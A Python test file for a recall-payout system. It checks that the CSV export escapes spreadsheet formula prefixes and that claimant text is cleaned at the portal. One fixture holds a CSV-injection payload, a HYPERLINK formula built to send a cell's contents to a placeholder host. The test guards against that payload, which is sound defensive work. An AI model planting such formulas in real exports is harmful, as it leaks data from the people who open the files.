"""The export batch CSV never lets a spreadsheet evaluate claimant text, and claimant text is cleaned at the portal."""

from __future__ import annotations

from types import SimpleNamespace
from uuid import uuid4

from recallops.api.schemas import PortalSubmit, clean_text
from recallops.payouts.export import render_csv, safe_cell


def test_formula_prefixes_are_neutralized() -> None:
    for hostile in ("=HYPERLINK(1)", "+1", "-1+2", "@SUM(A1)", "\tx", "\rx"):
        assert safe_cell(hostile).startswith("'")
    assert safe_cell("1 Main St") == "1 Main St" and safe_cell(None) == ""


def test_a_hostile_name_reaches_the_file_inert() -> None:
    row = SimpleNamespace(
        id=uuid4(),
        claim_id=uuid4(),
        amount_cents=4999,
        currency="usd",
        claimant={"name": '=HYPERLINK("https://x.example/?d="&C3,"Verify")', "mailing_address": "PO Box 7"},
    )
    body = render_csv([row]).decode()
    assert "'=HYPERLINK" in body and "PO Box 7" in body


def test_claimant_text_is_cleaned_and_empty_values_become_none() -> None:
    assert clean_text("  1 Main\nSt\t ") == "1 Main St"
    assert clean_text("-") is None and clean_text("   ") is None and clean_text(None) is None
    submitted = PortalSubmit(
        name="Avery",
        email="a@example.com",
        address_line1="1 Main St",
        city="X",
        state="IL",
        zip="1",
        serial_claimed=" - ",
    )
    assert submitted.serial_claimed is None
